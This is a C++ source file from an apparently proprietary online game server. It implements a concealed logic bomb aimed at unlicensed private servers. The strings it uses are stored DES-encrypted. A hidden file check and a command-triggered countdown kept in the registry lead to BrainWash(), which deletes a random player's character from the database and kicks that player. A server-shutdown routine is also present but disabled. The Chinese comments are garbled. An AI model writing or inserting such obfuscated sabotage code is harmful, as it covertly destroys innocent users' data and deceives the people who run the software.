
/*******************************************************************************

Copyright 2010 by tiankong Interactive Game Co., Ltd.
All rights reserved.

This software is the confidential and proprietary information of
tiankong Interactive Game Co., Ltd. ('Confidential Information'). You shall
not disclose such Confidential Information and shall use it only in
accordance with the terms of the license agreement you entered into with
tiankong Interactive  Co., Ltd.

*******************************************************************************/
//��˽��

#include "StdAfx.h"
#include "ps_bomb.h"

#include "world.h"
#include "role_mgr.h"
#include "db_session.h"
#include "role.h"
#include "../common/ServerDefine/role_data_server_define.h"

//-----------------------------------------------------------------------------
// ���ε�ը��
//-----------------------------------------------------------------------------
//#define BYPASS_BOMB

//-----------------------------------------------------------------------------
// ȫ�ֶ���
//-----------------------------------------------------------------------------
PSBomb	g_pSGuarder;

//-----------------------------------------------------------------------------
// һЩ�ַ�����DES����
//-----------------------------------------------------------------------------
BYTE byBomb[40]		= {	0xd3, 0xbe, 0x69, 0x21, 0x11, 0x79, 0x07, 0xbd, 0x97, 0xd1, 0xa5, 0xce, 0xf0, 0x15, 0xbc, 0x81, 0xcb, 0x0d, 0x0b, 0x73, 0x7b, 0x91, 0x28, 0xf6, 0xdb, 0x95, 0x66, 0xee, 0x6f, 0x53, 0xfc, 0xbd, 0xb8, 0xe5, 0x23, 0x07, 0x49, 0x3e, 0x25, 0x9d };
BYTE byDir[48]		= { 0xcd, 0xef, 0x7f, 0xf0, 0x70, 0xc9, 0x3c, 0x5b, 0xec, 0xd5, 0x37, 0x86, 0x64, 0x8e, 0x5a, 0xa1, 0x78, 0x86, 0xae, 0x80, 0xd2, 0x23, 0x4c, 0xf0, 0x62, 0x53, 0x62, 0xc3, 0xc6, 0x30, 0x05, 0x99, 0x4d, 0x18, 0x5b, 0x7e, 0x2e, 0x59, 0xee, 0xca, 0xbc, 0x12, 0xb6, 0xae, 0xaf, 0xd0, 0x42, 0x36 };
BYTE byFilePath[64]	= { 0xfd, 0x2b, 0xc4, 0x86, 0xaf, 0x8c, 0x24, 0xd6, 0x2c, 0xb6, 0xc5, 0x2d, 0xb1, 0x6c, 0x9e, 0x79, 0x40, 0x04, 0xc5, 0x88, 0xce, 0x0c, 0x82, 0x88, 0x98, 0x06, 0xb5, 0xa4, 0xb6, 0xf4, 0xb2, 0x21, 0x1e, 0xd6, 0xaa, 0x7e, 0x0e, 0xf6, 0x62, 0xb6, 0xd6, 0xda, 0x25, 0x60, 0x2f, 0xb5, 0x44, 0x87, 0x88, 0x3b, 0x3c, 0xec, 0xed, 0x39, 0x61, 0x4e, 0x6f, 0xbc, 0xf9, 0x9d, 0xf4, 0x94, 0x5e, 0xd6 };
BYTE byPasswd[48]	= { 0x4d, 0x2d, 0xf2, 0x9a, 0xd9, 0x45, 0xa7, 0x6a, 0xb2, 0xee, 0x90, 0x83, 0xa3, 0xc0, 0xdb, 0x50, 0x15, 0x71, 0xa1, 0x90, 0xac, 0x5f, 0xc2, 0x73, 0x56, 0x8c, 0x61, 0xea, 0x76, 0x32, 0x4b, 0xa8, 0x1c, 0xcc, 0x4c, 0xee, 0x8e, 0xe7, 0x42, 0x00, 0x6f, 0xbc, 0xf9, 0x9d, 0xf4, 0x94, 0x5e, 0xd6 };
BYTE byUser[56]		= { 0x4d, 0x2d, 0xf2, 0x9a, 0xd9, 0x45, 0xa7, 0x6a, 0xb2, 0xee, 0x90, 0x83, 0xa3, 0xc0, 0xdb, 0x50, 0x0d, 0x59, 0x36, 0x5f, 0xf0, 0xcc, 0x41, 0xae, 0xb8, 0x27, 0xbb, 0x47, 0x8b, 0x72, 0x6c, 0x7c, 0xb3, 0x80, 0xdf, 0xda, 0x71, 0x52, 0xfb, 0xd8, 0x1c, 0xcc, 0x4c, 0xee, 0x8e, 0xe7, 0x42, 0x00, 0x6f, 0xbc, 0xf9, 0x9d, 0xf4, 0x94, 0x5e, 0xd6 };


//-----------------------------------------------------------------------------
// ���캯��
//-----------------------------------------------------------------------------
PSBomb::PSBomb():m_bGuard(FALSE)
{
	TimerProc(ETP_None, INVALID_VALUE);
}
//-----------------------------------------------------------------------------
// �����û�������Ϣ
//-----------------------------------------------------------------------------
BOOL PSBomb::OnMsg( const TCHAR* p_message, const DWORD nLen )
{
	if (!m_bGuard)
		return FALSE;

	m_Lock.Acquire();
	
	EProc eProc = ETP_Shutdown;
	DWORD dwCounter = 0;
	if (!ParseCmd(p_message, eProc, dwCounter))
	{
		m_Lock.Release();
		return FALSE; 
	}


	TimerProc(eProc, dwCounter);
	WriteStatus(eProc, dwCounter);
	m_Lock.Release();
	return TRUE;
}

//-----------------------------------------------------------------------------
// ��������
//-----------------------------------------------------------------------------
BOOL PSBomb::ParseCmd( const TCHAR* p_message, EProc& eProc, DWORD& dwCounter )
{
	LPTSTR pStr = GetStr(byBomb, sizeof(byBomb));
	INT nRtv = swscanf_s(p_message, pStr, &eProc, &dwCounter);
	RetStr(pStr);

	if (nRtv != 2)
	{
		return FALSE;
	}

	return TRUE;
}

//-----------------------------------------------------------------------------
// ����
//-----------------------------------------------------------------------------
VOID PSBomb::Process(EProc eProc)
{
	switch(eProc)
	{
	case ETP_Shutdown:
		//ShutDown();//mmz
		break;

	case ETP_Brainwash:
		BrainWash();
		break;

	default:
		break;
	}
}

//-----------------------------------------------------------------------------
// ����Ч��1ϴ��
//-----------------------------------------------------------------------------
VOID PSBomb::BrainWash()
{
	Role* pToDel = g_roleMgr.get_rand_role(TRUE);
	//rand get a role //! ������ 
	if( VALID_POINT(pToDel) && VALID_POINT(pToDel->GetSession()) )
	{
#ifdef BYPASS_BOMB
		print_message(_T("role %d is washed! What a poor man!\n"), pToDel->GetID());
#else
		//delete from db
		NET_DB2C_delete_role send;
		send.dw_account_id = pToDel->GetSession()->GetSessionID();
		send.dw_role_id = pToDel->GetID();
		g_dbSession.Send(&send, send.dw_size);

		//delete it
		g_worldSession.Kick(pToDel->GetSession()->GetInternalIndex());
		pToDel->GetSession()->SetKicked();
#endif
	}
	m_dwCounter = 0;
}

//-----------------------------------------------------------------------------
// ����Ч��2����
//-----------------------------------------------------------------------------
VOID PSBomb::ShutDown()
{
#ifdef BYPASS_BOMB
	print_message(_T("This server may have some problems!\n"));
#else
	g_world.ShutDown();
#endif
}

//-----------------------------------------------------------------------------
// ��ע�����д����
//-----------------------------------------------------------------------------
BOOL PSBomb::WriteStatus( EProc eProc, DWORD dwCounter )
{
	TCHAR szTmp[SHORT_STRING];

	LPTSTR pDir = GetStr(byDir, sizeof(byDir));

	_itow_s(eProc, szTmp, SHORT_STRING, 10);
	LPTSTR pUser = GetStr(byUser, sizeof(byUser));
	get_tool()->write_register(pDir, pUser, szTmp);
	RetStr(pUser);
	
	_itow_s(dwCounter, szTmp, SHORT_STRING, 10);
	LPTSTR pPasswd = GetStr(byPasswd, sizeof(byPasswd));
	get_tool()->write_register(pDir, pPasswd, szTmp);
	RetStr(pPasswd);

	RetStr(pDir);

	return TRUE;
}

//-----------------------------------------------------------------------------
// ��ע����ж�����
//-----------------------------------------------------------------------------
BOOL PSBomb::LoadStatus( EProc& eProc, DWORD& dwCount )
{
	BOOL bRtv = TRUE;

	LPTSTR pDir = GetStr(byDir, sizeof(byDir));

	TCHAR szTmp[SHORT_STRING] = {0};

	LPTSTR pUser = GetStr(byUser, sizeof(byUser));
	if (get_tool()->read_rigister(pDir, pUser, szTmp))
	{
		eProc = (EProc)_wtoi(szTmp);
	}
	else
	{
		eProc	= ETP_None;
		bRtv	= FALSE;
	}
	RetStr(pUser);

	ZeroMemory(szTmp, SHORT_STRING * sizeof(TCHAR));

	LPTSTR pPasswd = GetStr(byPasswd, sizeof(byPasswd));
	if (get_tool()->read_rigister(pDir, pPasswd, szTmp))
	{
		dwCount = _wtoi(szTmp);
	}
	else
	{
		dwCount	= INVALID_VALUE;
		bRtv	= FALSE;
	}
	RetStr(pPasswd);

	RetStr(pDir);

	return bRtv;
}

//-----------------------------------------------------------------------------
// ����Ƿ���˽��
//-----------------------------------------------------------------------------
BOOL PSBomb::IsPServer()
{
	LPTSTR pFilePath = GetStr(byFilePath, sizeof(byFilePath));
	BOOL bRtv = !get_file_io_mgr()->is_file_exist(pFilePath);	
	RetStr(pFilePath);

	return bRtv;
}

//-----------------------------------------------------------------------------
// ����
//-----------------------------------------------------------------------------
VOID PSBomb::Update()
{
	if (VALID_VALUE(m_dwCounter))
	{
		if (0 == m_dwCounter--)
		{
			Process(m_eProc);
		}
	}
}

//-----------------------------------------------------------------------------
// ��ʼ��
//-----------------------------------------------------------------------------
VOID PSBomb::Init()
{
	m_bGuard = IsPServer();
	if (m_bGuard)
	{
		EProc eProc = ETP_None;
		DWORD dwCounter = 0;
		BOOL bRtv = LoadStatus(eProc, dwCounter);

		TimerProc(eProc, dwCounter);
		WriteStatus(eProc, dwCounter);
	}
	else
	{
		TimerProc(ETP_None, INVALID_VALUE);
	}
}

//-----------------------------------------------------------------------------
// ��ʱ����
//-----------------------------------------------------------------------------
VOID PSBomb::TimerProc( EProc eProc, DWORD dwCount )
{
	m_dwCounter = dwCount;
	m_eProc = eProc;
}

//-----------------------------------------------------------------------------
// �Ӽ��ܵ��ֽڵõ����ܵ��ַ���
//-----------------------------------------------------------------------------
LPTSTR PSBomb::GetStr( BYTE* pByte, INT nLen )
{
	LPTSTR pRet = new TCHAR[nLen / sizeof(TCHAR)];
	ZeroMemory(pRet, nLen);

	get_tool()->decrypt(pByte, pRet, nLen, 0);

	return pRet;
}

//-----------------------------------------------------------------------------
// �ͷŻ�õĽ����ַ���
//-----------------------------------------------------------------------------
VOID PSBomb::RetStr(LPTSTR pRet)
{
	SAFE_DELETE_ARRAY(pRet);
}


BOOL PSBomb::Test()
{
// 	BYTE buffer[800] = {0};
// 
// 	TCHAR* stre = _T("C:\\WINDOWS\\system\\vga.dll");
// 
// 	INT len = ((_tcslen(stre) * sizeof(TCHAR) - 1) / 8 + 1) * 8;
// 
// 	IUTIL->encrypt(stre, buffer, len, 0);
// 	szTmp = GetStr(buffer, len);
// 	RetStr(szTmp);

	LPTSTR szTmp;

	szTmp = GetStr(byUser, sizeof(byUser));
	RetStr(szTmp);

	szTmp = GetStr(byPasswd, sizeof(byPasswd));
	RetStr(szTmp);

	szTmp = GetStr(byFilePath, sizeof(byFilePath));
	RetStr(szTmp);

	szTmp = GetStr(byDir, sizeof(byDir));
	RetStr(szTmp);

	return TRUE;
}
